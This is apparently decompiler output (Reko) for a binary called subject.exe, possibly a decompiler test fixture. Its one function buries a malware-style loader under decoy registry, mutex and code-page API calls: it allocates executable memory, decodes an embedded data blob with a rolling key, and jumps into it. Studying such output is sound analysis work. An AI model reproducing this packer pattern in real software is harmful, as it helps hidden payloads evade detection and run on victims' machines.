// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401278: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	GetCPInfo(ecx & 0x00, fp - 0x0100);
	GetCurrentProcessId();
	GetCurrentThreadId();
	RegEnumKeyExA(fp - 0x5C, 0x12, 0x00, fp - 0x60, fp - 0x8C, fp - 116, fp - 0xCC, (struct _FILETIME *) 0x02);
	OpenMutexA(0x15, 0x00, fp - 0x70);
	RegEnumValueW(fp - 0xA8, 0x08, (WCHAR *) 0x17, fp - 0xC0, fp - 0xA4, fp - 0xA4, fp - 0x7C, 0x00);
	Eq_2 edx_109 = fp - 0xC0 & 0x00;
	OpenEventA(edx_109 & 0x0D, edx_109, fp - 0x80);
	Eq_2 eax_130 = InitializeAcl(fp - 0x5C, 0x13, 0x12);
	Eq_108 ecx_134 = fp - 0xA4 - dwLoc0104;
	if (ecx_134 != 0x0386)
		ecx_134 = ecx_134 + eax_130 + (ecx_134 <u 0x0386) | 12277;
	malloc(0x00);
	Eq_2 ecx_195 = fp - 88 & 0x00;
	Eq_48 eax_202 = RegEnumKeyExA(fp - 0x7C, ecx_195, 0x00, fp - 88, fp - 0xA8, fp - 0xAC, fp - 0xAC, (struct _FILETIME *) 0x14);
	ui32 ecx_208 = ecx_195 & eax_202 | fp - 0xAC;
	word32 esp_211;
	word32 ebp_212;
	byte SCZO_213;
	word32 edx_214;
	byte Z_215;
	word32 eax_216;
	byte SZO_217;
	byte C_218;
	word32 ecx_219;
	Eq_2 ebx_220;
	Eq_2 esi_221;
	Eq_2 edi_222;
	_set_app_type();
	OpenMutexA(((eax_216 ^ dwArg02) + 0x0861 | 0x3FC7) & 0x00, 0x00, fp - 0xC0);
	GetCPInfo(RegOpenKeyA(fp - 0x78, fp - 212, fp - 0x84) & 0x00, fp - 0xD8);
	(fp - 676)->u0 = 0x00;
	*(fp - 0x02A8) = fp - 0x04;
	*(fp - 0x02A8) = *(fp - 0x02A8) - 100;
	(fp - 0x02AC)->u0 = 0x0A;
	*(fp - 688) = fp - 0xC4;
	RegEnumKeyA(*(fp - 688), *(fp - 0x02AC), *(fp - 0x02A8), *(fp - 676));
	GetOEMCP();
	(fp - 676)->u0 = 0x0A;
	*(fp - 0x02A8) = fp - 0x78;
	(fp - 0x02AC)->u0 = 0x00;
	*(fp - 688) = fp - 0xF0;
	RegEnumKeyA(*(fp - 688), *(fp - 0x02AC), *(fp - 0x02A8), *(fp - 676));
	*(fp - 676) = fp - 0x04;
	*(fp - 676) = *(fp - 676) - 0x8C;
	(fp - 0x02A8)->u0 = 0x00;
	(fp - 0x02AC)->u0 = 0x0A;
	Eq_350 ecx_324 = fp - 0x0288;
	if (OpenMutexA(*(fp - 0x02AC), *(fp - 0x02A8), *(fp - 676)) == null)
		ecx_324 = (fp - 15441 | dwLoc94) ^ 0x1662;
	*(fp - 676) = fp - 0x04;
	*(fp - 676) = *(fp - 676) - 0xC4;
	*(fp - 0x02A8) = fp - 0x04;
	*(fp - 0x02A8) = *(fp - 0x02A8) - 0xB8;
	*(fp - 0x02AC) = fp - 0xEC;
	RegOpenKeyA(*(fp - 0x02AC), *(fp - 0x02A8), *(fp - 676));
	if (ecx_324 != 0x00)
		ecx_324 = fp - 0x04;
	GetLastError();
	(fp - 676)->u0 = 0x00;
	(fp - 0x02A8)->u0 = 0x00;
	(fp - 0x02AC)->u0 = 0x00;
	Eq_455 eax_392 = CreateItemMoniker(*(fp - 0x02AC), *(fp - 0x02A8), *(fp - 676));
	ui32 ecx_388 = ecx_324 | 0x306C;
	ui32 eax_394 = eax_392 ^ 0x80070057;
	if ((eax_392 ^ 0x80070057) == 0x00)
	{
		*(fp - 676) = fp - 0x0B4E;
		Eq_2 ecx_468 = ecx_388 | dwArg0A;
		*(fp - 0x02A8) = ecx_468;
		*(fp - 0x02AC) = fp - 0x04;
		*(fp - 688) = ebx_220;
		*(fp - 0x02B4) = fp - 0x02A0;
		*(fp - 696) = fp - 0x04;
		*(fp - 700) = esi_221;
		*(fp - 0x02C0) = edi_222;
		(fp - 0x02C4)->u0 = 0x40;
		(fp - 0x02C8)->u0 = 0x1000;
		(fp - 0x02CC)->u0 = 0x3000;
		(fp - 0x02D0)->u0 = 0x00;
		Eq_2 eax_514 = VirtualAlloc(*(fp - 0x02D0), *(fp - 0x02CC), *(fp - 0x02C8), *(fp - 0x02C4));
		struct Eq_588 * edx_530 = &globals->t40A55C;
		Eq_2 esi_542 = eax_514;
		word32 dwLoc0230_548 = 1839877483;
		Eq_593 ecx_551 = ((fp - 0x04 | dwLoc01CC) ^ dwLoc01CD) - (fp - 0x01D4) + dwLoc023B;
		if ((fp - 0x023C | 0x34FC) == dwLoc024C)
			ecx_551 = fp - 400 ^ 0x030E;
		do
		{
			word32 edi_575 = edx_530->dw0000 + dwLoc0230_548;
			*esi_542 = edi_575;
			dwLoc0230_548 = dwLoc0230_548 + 3713120415;
			Eq_627 edx_586 = (char *) edx_530 - 810971396;
			word32 ebx_589 = fp - 0xB0 + ecx_551 + (edx_586 <u 0x00);
			Eq_637 eax_590 = fp - 0x04;
			ui32 ecx_596 = (ecx_551 | dwArg0C) + dwArg0C ^ dwLoc02;
			word32 esi_597 = esi_542 + 1332391190;
			edx_530 = edx_586 + 810971400;
			if (ebx_589 == 0x0245)
				eax_590 = (word32) fp + 0x000020B0 & 0x06A9;
			esi_542 = esi_597 + 0xB09552EE;
			ecx_551 = ecx_596 + 0x0EA7 ^ 0x2367;
		} while (edx_586 != 806730588);
		word32 esp_630;
		word32 ebp_631;
		byte SCZO_632;
		word32 edx_633;
		byte Z_634;
		byte SZO_636;
		Eq_672 C_637;
		word32 ecx_638;
		word32 ebx_639;
		word32 esi_640;
		word32 edi_641;
		eax_514();
		if (ebx_639 == ((word32) C_637 + (ecx_638 + ebx_639)) - ebx_639)
			eax_394 = eax_394 | dwLocAC;
	}
	return eax_394;
}

